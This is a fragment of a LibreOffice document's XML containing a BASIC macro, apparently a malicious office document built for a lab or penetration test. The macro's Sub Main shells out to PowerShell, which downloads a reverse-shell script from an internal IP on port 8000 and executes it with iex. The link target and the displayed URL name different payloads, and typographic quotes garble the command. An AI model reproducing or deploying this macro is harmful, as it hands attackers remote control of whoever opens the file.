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REM <text:s/>***** <text:s/>BASIC <text:s/>*****</text:p>
      <text:p text:style-name="P1">Sub Main</text:p>
      <text:p text:style-name="P2">Shell(“cmd /c powershell iex (New-Object Net.WebClient).DownloadString(‘<text:a xlink:type="simple" xlink:href="http://192.168.45.193:8000/Invoke-PowerShellTcpEx.ps1%E2%80%99" text:style-name="ListLabel_20_1" text:visited-style-name="ListLabel_20_1"><text:span text:style-name="T1">http://192.168.45.193:8000/shell-x64.exe’</text:span></text:a>)”)</text:p>
      <text:p text:style-name="P1">End Sub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4" meta:character-count="155" meta:non-whitespace-character-count="142"/>
    <meta:generator>LibreOfficeDev/6.0.5.2$Linux_X86_64 LibreOffice_project/</meta:generator>
  </office:meta>
</office:document-meta>
</file>